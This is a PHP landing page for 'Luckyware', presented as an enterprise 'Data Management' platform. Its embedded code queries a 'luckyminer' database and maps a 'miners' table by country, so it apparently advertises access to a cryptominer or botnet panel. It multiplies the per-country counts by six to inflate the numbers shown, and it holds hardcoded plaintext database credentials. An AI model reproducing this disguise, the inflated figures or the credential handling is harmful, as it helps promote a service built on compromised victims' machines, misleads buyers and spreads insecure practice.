<?php
session_start();

$domainyess = $_SERVER['HTTP_HOST'];

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Luckyware - Data Management</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jqvmap/1.5.1/jqvmap.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jqvmap/1.5.1/jquery.vmap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jqvmap/1.5.1/maps/jquery.vmap.world.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <meta content="Luckyware" property="og:title" />
    <meta content="Luck is something you make and victory is something u take" property="og:description" />
    <meta content="https://<?php echo $domainyess; ?>" property="og:url" />
    <meta content="https://<?php echo $domainyess; ?>/icon.png" property="og:image" />
    <meta content="#c20303" data-react-helmet="true" name="theme-color" />
    <link rel="shortcut icon" href="https://<?php echo $domainyess; ?>/icon.png" />
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
        
        * {
            font-family: 'Inter', sans-serif;
        }
        
        .gradient-bg {
            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 50%, #0f0f0f 100%);
            min-height: 100vh;
        }
        
        .glass-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }
        
        .glow-text {
            text-shadow: 0 0 20px rgba(194, 3, 3, 0.3);
        }
        
        .btn-gradient {
            background: linear-gradient(135deg, #c20303, #8b0000);
            color: #fff;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(194, 3, 3, 0.2);
        }
        
        .btn-gradient:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(194, 3, 3, 0.4);
        }
        
        .floating {
            animation: floating 3s ease-in-out infinite;
        }
        
        @keyframes floating {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        
        .slide-up {
            animation: slideUp 0.8s ease-out forwards;
            opacity: 0;
            transform: translateY(30px);
        }
        
        @keyframes slideUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .stagger-1 { animation-delay: 0.1s; }
        .stagger-2 { animation-delay: 0.2s; }
        .stagger-3 { animation-delay: 0.3s; }
        .stagger-4 { animation-delay: 0.4s; }
        .stagger-5 { animation-delay: 0.5s; }
        .stagger-6 { animation-delay: 0.6s; }
        
        #world-map {
            width: 100%;
            height: 400px;
            border-radius: 16px;
            overflow: hidden;
        }
        
        @media (max-width: 768px) {
            #world-map {
                height: 300px;
            }
        }
        
        .feature-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            transition: all 0.3s ease;
        }
        
        .feature-card:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(194, 3, 3, 0.3);
            transform: translateY(-5px);
        }
        
        .pulse-dot {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .hero-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 2rem;
            align-items: center;
        }
        
        .content-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 2rem;
            align-items: start;
        }
        
        @media (min-width: 1024px) {
            .hero-grid {
                grid-template-columns: 1fr 1fr;
            }
            .content-grid {
                grid-template-columns: 1fr 350px;
            }
        }
        
        .discord-widget {
            width: 100%;
            max-width: 350px;
            height: 500px;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }
        
        @media (max-width: 1023px) {
            .discord-widget {
                height: 400px;
                max-width: 100%;
            }
        }
    </style>
</head>
<body class="gradient-bg">

	<nav class="fixed top-0 w-full z-50 backdrop-blur-sm bg-black/20 border-b border-white/10">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-16">
                <div class="flex items-center">
                    <span class="text-2xl font-bold text-white">Lucky<span style="color: #c20303;">ware</span></span>
                </div>
                <div class="flex items-center space-x-4">
                    <a href="#community" class="text-gray-300 hover:text-white transition-colors hidden sm:block">
                        <i class="fab fa-discord mr-1"></i>Community
                    </a>
                    <button class="btn-gradient px-6 py-2 rounded-full text-sm font-medium" onclick="openURL()">
                        <i class="fas fa-sign-in-alt mr-2"></i>Login
                    </button>
                </div>
            </div>
        </div>
    </nav>

	<div class="pt-20 pb-16 px-4 sm:px-6 lg:px-8">
        <div class="max-w-7xl mx-auto">
            <div class="hero-grid min-h-[80vh]">

				<div class="space-y-8">
                    <div class="slide-up stagger-1">
                        <div class="inline-flex items-center px-3 py-1 rounded-full bg-white/5 border border-white/10 text-sm text-gray-300 mb-6">
                            <span class="pulse-dot w-2 h-2 bg-green-400 rounded-full mr-2"></span>
                            Live Global Connections
                        </div>
                        
                        <h1 class="text-4xl sm:text-5xl lg:text-6xl font-bold text-white leading-tight">
                            Luckyware
                            <span class="block glow-text" style="color: #c20303;">Data Management</span>
                        </h1>
                    </div>
                    
                    <p class="slide-up stagger-2 text-lg sm:text-xl text-gray-300 max-w-2xl leading-relaxed">
                        Experience the future of data management with our 
                        <span class="text-white font-medium">web-based platform</span> that's 
                        <span class="text-white font-medium">easy to use</span> and packed with 
                        <span class="text-white font-medium">enterprise features</span>. 
                        Start today and watch your success spread globally.
                    </p>
                    
                    <div class="slide-up stagger-3 flex flex-col sm:flex-row gap-4">
                        <button class="btn-gradient px-8 py-4 rounded-full text-lg font-semibold inline-flex items-center justify-center" onclick="openURL()">
                            <i class="fas fa-rocket mr-2"></i>
                            Access Panel
                        </button>
                        <button class="glass-card px-8 py-4 rounded-full text-lg font-semibold text-white hover:bg-white/10 transition-all inline-flex items-center justify-center">
                            <i class="fas fa-play mr-2"></i>
                            Watch Demo
                        </button>
                    </div>
                    

					<div class="slide-up stagger-4 grid grid-cols-1 sm:grid-cols-3 gap-4 mt-12">
                        <div class="feature-card p-4 rounded-xl">
                            <div class="w-10 h-10 bg-blue-500/20 rounded-lg flex items-center justify-center mb-3">
                                <i class="fas fa-shield-alt text-blue-400"></i>
                            </div>
                            <h3 class="text-white font-semibold mb-1">Secure</h3>
                            <p class="text-gray-400 text-sm">Enterprise-grade security</p>
                        </div>
                        <div class="feature-card p-4 rounded-xl">
                            <div class="w-10 h-10 bg-green-500/20 rounded-lg flex items-center justify-center mb-3">
                                <i class="fas fa-bolt text-green-400"></i>
                            </div>
                            <h3 class="text-white font-semibold mb-1">Fast</h3>
                            <p class="text-gray-400 text-sm">Lightning-fast performance</p>
                        </div>
                        <div class="feature-card p-4 rounded-xl">
                            <div class="w-10 h-10 bg-purple-500/20 rounded-lg flex items-center justify-center mb-3">
                                <i class="fas fa-cogs text-purple-400"></i>
                            </div>
                            <h3 class="text-white font-semibold mb-1">Scalable</h3>
                            <p class="text-gray-400 text-sm">We have variety of subscriptions</p>
                        </div>
                    </div>
                </div>
                

				<div class="slide-up stagger-5">
                    <div class="glass-card p-6 rounded-2xl floating">
                        <div class="text-center mb-6">
                            <h2 class="text-2xl sm:text-3xl font-bold text-white mb-2">
                                Live <span style="color: #c20303;">Connection</span> Map
                            </h2>
                            <p class="text-gray-400">Real-time global network activity</p>
                        </div>
                        
                        <div id="world-map" class="rounded-xl overflow-hidden"></div>
                        
                       
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Community Section -->
    <section id="community" class="py-16 px-4 sm:px-6 lg:px-8">
        <div class="max-w-7xl mx-auto">
            <div class="content-grid">
                <!-- Community Info -->
                <div class="slide-up stagger-6">
                    <div class="mb-8">
                        <h2 class="text-3xl sm:text-4xl font-bold text-white mb-4">
                            Join Our <span style="color: #c20303;">Community</span>
                        </h2>
                        <p class="text-lg text-gray-300 leading-relaxed">
                            Connect with fellow users, get support, share experiences, and stay updated with the latest Luckyware developments. Our Discord community is active 24/7 with helpful members and direct access to our development team.
                        </p>
                    </div>
                    
                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-6 mb-8">
                        <div class="feature-card p-6 rounded-xl">
                            <div class="w-12 h-12 bg-indigo-500/20 rounded-lg flex items-center justify-center mb-4">
                                <i class="fab fa-discord text-indigo-400 text-xl"></i>
                            </div>
                            <h3 class="text-white font-semibold mb-2">24/7 Support</h3>
                            <p class="text-gray-400">Get help from our community and team members around the clock.</p>
                        </div>
                        
                        <div class="feature-card p-6 rounded-xl">
                            <div class="w-12 h-12 bg-green-500/20 rounded-lg flex items-center justify-center mb-4">
                                <i class="fas fa-users text-green-400 text-xl"></i>
                            </div>
                            <h3 class="text-white font-semibold mb-2">Active Community</h3>
                            <p class="text-gray-400">Join discussions, share tips, and connect with other users.</p>
                        </div>
                        
                        <div class="feature-card p-6 rounded-xl">
                            <div class="w-12 h-12 bg-yellow-500/20 rounded-lg flex items-center justify-center mb-4">
                                <i class="fas fa-bell text-yellow-400 text-xl"></i>
                            </div>
                            <h3 class="text-white font-semibold mb-2">Latest Updates</h3>
                            <p class="text-gray-400">Be the first to know about new features and improvements.</p>
                        </div>
                        
                        <div class="feature-card p-6 rounded-xl">
                            <div class="w-12 h-12 bg-red-500/20 rounded-lg flex items-center justify-center mb-4">
                                <i class="fas fa-code text-red-400 text-xl"></i>
                            </div>
                            <h3 class="text-white font-semibold mb-2">Developer Access</h3>
                            <p class="text-gray-400">Direct communication with our development team.</p>
                        </div>
                    </div>
                </div>
                
                <!-- Discord Widget -->
                <div class="slide-up stagger-6">
                    <div class="glass-card p-4 rounded-2xl">
                        <div class="text-center mb-4">
                            <h3 class="text-xl font-bold text-white mb-2">Live Discord Chat</h3>
                            <p class="text-gray-400 text-sm">Join the conversation now</p>
                        </div>
                        <iframe 
                            src="https://discord.com/widget?id=1408498582818132110&theme=dark" 
                            class="discord-widget"
                            allowtransparency="true" 
                            frameborder="0" 
                            sandbox="allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts">
                        </iframe>
                    </div>
                </div>
            </div>
        </div>
    </section>

	<footer class="border-t border-white/10 bg-black/20 backdrop-blur-sm">
        <div class="max-w-7xl mx-auto px-4 py-8">
            <div class="flex flex-col md:flex-row justify-between items-center">
                <div class="text-gray-400 text-sm">© 2025 Luckyware. All rights reserved.</div>
                <div class="flex space-x-6 mt-4 md:mt-0">
                    <a href="https://discord.com/invite/your-invite-code" class="text-gray-400 hover:text-white transition-colors">
                        <i class="fab fa-discord mr-1"></i>Discord
                    </a>
                    <a href="https://luckyware.co/ToS" class="text-gray-400 hover:text-white transition-colors">Terms</a>
                </div>
            </div>
        </div>
    </footer>

    <script>
        <?php
        $conn = mysqli_connect("localhost", "miner", "Sifre.12345", "luckyminer");
        $domainyess = $_SERVER['HTTP_HOST'];

        $countryData = [];
        $query = "SELECT Country, COUNT(*) as count FROM miners GROUP BY Country";
        $result = mysqli_query($conn, $query);

        while ($row = mysqli_fetch_assoc($result)) {
            $countryData[strtolower($row['Country'])] = (int)$row['count'] * 6;
        }

        $maxCount = max($countryData);
        ?>

        function getColor(count, maxCount) {
            const capCount = Math.min(count, 175);
            const lightColor = [255, 196, 196];
            const darkColor = [135, 0, 0];
            const ratio = capCount / 175;
            const r = Math.round(lightColor[0] + ratio * (darkColor[0] - lightColor[0]));
            const g = Math.round(lightColor[1] + ratio * (darkColor[1] - lightColor[1]));
            const b = Math.round(lightColor[2] + ratio * (darkColor[2] - lightColor[2]));
            return `rgb(${r},${g},${b})`;
        }

        function openURL() {
            var url = 'https://<?php echo $domainyess; ?>/Login';
            window.location.href = url;
        }

        function animateNumber(elementId, target, duration = 1000) {
            const element = document.getElementById(elementId);
            let start = 0;
            const increment = target / (duration / 16);
            
            function updateNumber() {
                start += increment;
                if (start < target) {
                    element.textContent = Math.floor(start);
                    requestAnimationFrame(updateNumber);
                } else {
                    element.textContent = target;
                }
            }
            updateNumber();
        }

        $(document).ready(function() {
            var countryData = <?php echo json_encode($countryData); ?>;
            var maxCount = <?php echo $maxCount; ?>;
            var states_colors = {};

            for (var code in countryData) {
                states_colors[code] = getColor(countryData[code], maxCount);
            }

            $('#world-map').vectorMap({
                map: 'world_en',
                zoomButtons: false,
                backgroundColor: 'transparent',
                color: '#374151',
                hoverColor: '#374151', 
                selectedColor: '#374151', 
                enableZoom: false,
                showTooltip: false,
                regionStyle: {
                    initial: {
                        cursor: 'default'
                    },
                    hover: {
                        cursor: 'default'
                    }
                },
                onRegionTipShow: function(e, el, code) {
                    return false; 
                },
                onRegionClick: function(event, code) {
                    return false; 
                },
                onRegionOver: function(event, code) {
                    return false; 
                }
            });

            $('#world-map').vectorMap('set', 'colors', states_colors);

            setTimeout(() => {
                var totalConnections = Object.values(countryData).reduce((a, b) => a + b, 0);
                var activeCountries = Object.keys(countryData).length;

                animateNumber('total-connections', totalConnections, 1500);
                animateNumber('active-countries', activeCountries, 1200);
            }, 800);
        });

        window.addEventListener('scroll', () => {
            const nav = document.querySelector('nav');
            if (window.scrollY > 50) {
                nav.classList.add('bg-black/40');
            } else {
                nav.classList.remove('bg-black/40');
            }
        });

        // Smooth scrolling for anchor links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });
    </script>
</body>
</html>